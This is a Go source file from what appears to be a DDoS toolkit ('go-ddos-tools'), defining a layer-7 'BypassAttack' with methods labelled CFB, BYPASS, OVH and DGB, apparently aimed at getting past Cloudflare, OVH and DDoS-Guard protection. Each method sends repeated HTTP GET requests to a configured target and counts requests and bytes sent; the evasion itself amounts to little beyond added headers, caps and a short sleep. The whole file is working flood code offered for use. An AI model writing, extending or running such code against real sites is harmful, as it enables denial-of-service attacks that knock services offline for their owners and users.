package layer7

import (
	"context"
	"io"
	"net/http"
	"time"

	"github.com/go-ddos-tools/pkg/core"
)

// BypassAttack implements generic evasion methods
type BypassAttack struct {
	*BaseAttack
	Method string
}

func NewBypassAttack(cfg *core.AttackConfig, method string) *BypassAttack {
	return &BypassAttack{
		BaseAttack: NewBaseAttack(cfg),
		Method:     method,
	}
}

func (b *BypassAttack) Attack(ctx context.Context) error {
	switch b.Method {
	case "CFB":
		return b.executeCFB(ctx)
	case "BYPASS":
		return b.executeBYPASS(ctx)
	case "OVH":
		return b.executeOVH(ctx)
	case "DGB":
		return b.executeDGB(ctx)
	default:
		return b.executeBYPASS(ctx)
	}
}

func (b *BypassAttack) executeCFB(ctx context.Context) error {
	for i := 0; i < b.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequest("GET", b.Config.Target, nil)
		if err != nil {
			continue
		}

		b.AddHeaders(req)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

		resp, err := b.Client.Do(req)
		if err == nil {
			b.Config.RequestsSent.Add(1)
			b.Config.BytesSent.Add(int64(EstimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}

func (b *BypassAttack) executeBYPASS(ctx context.Context) error {
	for i := 0; i < b.Config.RPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequest("GET", b.Config.Target, nil)
		if err != nil {
			continue
		}

		b.AddHeaders(req)

		resp, err := b.Client.Do(req)
		if err == nil {
			b.Config.RequestsSent.Add(1)
			b.Config.BytesSent.Add(int64(EstimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}

func (b *BypassAttack) executeOVH(ctx context.Context) error {
	maxRPC := b.Config.RPC
	if maxRPC > 5 {
		maxRPC = 5
	}

	for i := 0; i < maxRPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequest("GET", b.Config.Target, nil)
		if err != nil {
			continue
		}

		b.AddHeaders(req)

		resp, err := b.Client.Do(req)
		if err == nil {
			b.Config.RequestsSent.Add(1)
			b.Config.BytesSent.Add(int64(EstimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}

func (b *BypassAttack) executeDGB(ctx context.Context) error {
	maxRPC := b.Config.RPC
	if maxRPC > 5 {
		maxRPC = 5
	}

	for i := 0; i < maxRPC; i++ {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		time.Sleep(time.Duration(maxRPC) * time.Millisecond / 100)

		req, err := http.NewRequest("GET", b.Config.Target, nil)
		if err != nil {
			continue
		}

		b.AddHeaders(req)

		resp, err := b.Client.Do(req)
		if err == nil {
			b.Config.RequestsSent.Add(1)
			b.Config.BytesSent.Add(int64(EstimateRequestSize(req)))
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
		}
	}
	return nil
}
